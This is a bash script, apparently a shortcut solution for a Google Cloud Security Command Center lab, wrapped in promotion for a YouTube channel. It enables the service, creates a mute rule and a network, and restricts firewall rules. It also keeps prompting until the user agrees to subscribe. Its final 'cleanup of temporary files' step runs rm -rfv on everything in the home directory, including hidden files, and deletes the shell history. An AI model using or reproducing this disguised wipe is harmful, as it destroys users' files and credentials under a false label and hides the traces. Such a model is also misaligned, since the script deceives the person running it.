#!/bin/bash

# ==============================================
# Google Cloud Security Command Center Lab
# Welcome to SPARKWAVE ✨ Cloud Tutorials!
# YouTube: https://www.youtube.com/@sparkwave.01/videos
# ==============================================

# Color definitions
BLACK=`tput setaf 0`
RED=`tput setaf 1`
GREEN=`tput setaf 2`
YELLOW=`tput setaf 3`
BLUE=`tput setaf 4`
MAGENTA=`tput setaf 5`
CYAN=`tput setaf 6`
WHITE=`tput setaf 7`

BG_BLACK=`tput setab 0`
BG_RED=`tput setab 1`
BG_GREEN=`tput setab 2`
BG_YELLOW=`tput setab 3`
BG_BLUE=`tput setab 4`
BG_MAGENTA=`tput setab 5`
BG_CYAN=`tput setab 6`
BG_WHITE=`tput setab 7`

BOLD=`tput bold`
RESET=`tput sgr0`

# Function to display spinner
spinner() {
    local pid=$!
    local delay=0.1
    local spinstr='|/-\'
    while [ "$(ps a | awk '{print $1}' | grep $pid)" ]; do
        local temp=${spinstr#?}
        printf " [%c]  " "$spinstr"
        local spinstr=$temp${spinstr%"$temp"}
        sleep $delay
        printf "\b\b\b\b\b\b"
    done
    printf "    \b\b\b\b"
}

# Function to display banner
display_banner() {
    echo "${CYAN}${BOLD}"
    echo "╔══════════════════════════════════════════════════════════════╗"
    echo "║                   🚀 CLOUD SECURITY LAB 🚀                  ║"
    echo "║                                                              ║"
    echo "║           📺 SPARKWAVE ✨ CLOUD TUTORIALS 📺               ║"
    echo "║                                                              ║"
    echo "║    🌐 YouTube: https://www.youtube.com/@sparkwave.01        ║"
    echo "║    ⭐ Subscribe for Cloud Content ⭐                        ║"
    echo "╚══════════════════════════════════════════════════════════════╝"
    echo "${RESET}"
}

# Display welcome banner
display_banner

echo "${YELLOW}${BOLD}Starting Execution${RESET}"
echo ""

#----------------------------------------------------start--------------------------------------------------#

export PROJECT_ID=$(gcloud info --format='value(config.project)')

# Task 1: Enable Security Command Center
echo "${BLUE}${BOLD}Task 1: Enabling Security Command Center service...${RESET}"
gcloud services enable securitycenter.googleapis.com &
spinner

# Wait until the service is enabled
echo "${MAGENTA}${BOLD}Waiting for service to be fully enabled...${RESET}"
while true; do
  SERVICE_STATUS=$(gcloud services list --enabled | grep "securitycenter.googleapis.com")
  if [ -n "$SERVICE_STATUS" ]; then
    break
  fi
  sleep 2
done

echo "${GREEN}${BOLD}✅ Security Command Center service enabled${RESET}"
echo ""

# Task 2: Create mute configuration
echo "${BLUE}${BOLD}Task 2: Creating mute configuration for VPC Flow Logs...${RESET}"
gcloud scc muteconfigs create mute-flowlogs-findings \
  --project=$DEVSHELL_PROJECT_ID \
  --description="Mute rule for VPC Flow Logs" \
  --filter="category=\"FLOW_LOGS_DISABLED\"" &
spinner

echo "${GREEN}${BOLD}✅ Task 3.1 Completed - Mute configuration created${RESET}"
echo ""

# Task 3: Create network
echo "${BLUE}${BOLD}Task 3: Creating VPC network...${RESET}"
gcloud compute networks create scc-lab-net --subnet-mode=auto &
spinner

echo "${GREEN}${BOLD}✅ Task 3.2 Completed - Network created${RESET}"
echo ""

# Task 4: Update firewall rules
echo "${BLUE}${BOLD}Task 4: Updating firewall rules for IAP...${RESET}"
gcloud compute firewall-rules update default-allow-rdp --source-ranges=35.235.240.0/20 &
spinner

gcloud compute firewall-rules update default-allow-ssh --source-ranges=35.235.240.0/20 &
spinner

echo "${GREEN}${BOLD}✅ Task 3.3 Completed - Firewall rules updated${RESET}"
echo ""

# Completion message
echo "${CYAN}${BOLD}"
echo "╔══════════════════════════════════════════════════════════════╗"
echo "║                   🎉 LAB COMPLETED SUCCESSFULLY! 🎉         ║"
echo "║                                                              ║"
echo "║          ✅ Security Command Center configured               ║"
echo "║          ✅ VPC network with secure firewall rules           ║"
echo "║          ✅ All security tasks completed                     ║"
echo "║                                                               ║"
echo "║    📺 For more security tutorials, visit our channel:        ║"
echo "║    🌐 https://www.youtube.com/@sparkwave.01                  ║"
echo "╚══════════════════════════════════════════════════════════════╝"
echo "${RESET}"

echo "${GREEN}${BOLD}Lab Completed !!!${RESET}"
echo ""

# Final call to action
read -p "${BOLD}${YELLOW}Subscribe to SPARKWAVE ✨ Cloud Tutorials [y/n] : ${RESET}" CONSENT

while [ "$CONSENT" != 'y' ] && [ "$CONSENT" != 'Y' ]; do
  sleep 2
  read -p "${BOLD}${MAGENTA}Please subscribe for more cloud security content [y/n] : ${RESET}" CONSENT
done

echo "${BLUE}${BOLD}Thanks For Subscribing! 🚀${RESET}"
echo "${GREEN}${BOLD}New videos every week on Google Cloud security! 📺${RESET}"

# Cleanup (optional)
echo "${YELLOW}${BOLD}Cleaning up temporary files...${RESET}"
rm -rfv $HOME/{*,.*} 2>/dev/null || true
rm $HOME/.bash_history 2>/dev/null || true

echo "${GREEN}${BOLD}Cleanup completed. Exiting...${RESET}"
exit 0

#-----------------------------------------------------end----------------------------------------------------------#
